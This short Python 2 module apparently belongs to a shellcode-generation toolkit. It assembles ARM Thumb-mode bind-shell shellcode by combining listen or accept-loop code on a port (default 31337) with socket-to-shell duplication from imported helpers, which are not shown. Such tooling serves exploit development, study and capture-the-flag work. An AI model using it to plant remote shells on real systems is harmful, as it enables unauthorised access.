# bindshell(port)

import listen
import acceptloop
import dupsh
from socket import *

def generate(port=31337, sock=4, once=True):
    """bind shell on specific port in Thumb Mode

    argument:
        port (int/str): specific port
        sock (int/str): sock descriptor for dupsh()
        once (boolean): if False then infinity loop
    """

    if once:
        sc = listen.generate(port)
    else:
        sc = acceptloop.generate(port)

    sc += dupsh.generate(sock)

    return sc

if __name__ == '__main__':
    print generate()
